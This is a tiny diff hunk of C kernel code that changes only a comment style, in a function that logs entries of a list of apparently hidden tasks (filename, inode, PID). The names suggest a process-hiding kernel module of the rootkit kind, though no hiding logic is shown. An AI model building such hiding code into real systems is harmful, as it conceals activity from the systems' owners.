@@ -123,8 +123,7 @@ wally_list_saved_tasks(void)
    struct hidden_tasks_node *node;
    list_for_each_entry(node, &hidden_tasks_node, list)
      {
-        /**< to help grep */
-
+        /* to help grep */
         if(node->fnode)
              printk(KERN_INFO "filename:%s|inode:%llu|task:%p|pid:%d\n",
                     node->fnode->filename, node->fnode->ino, node->task, node->task->pid);
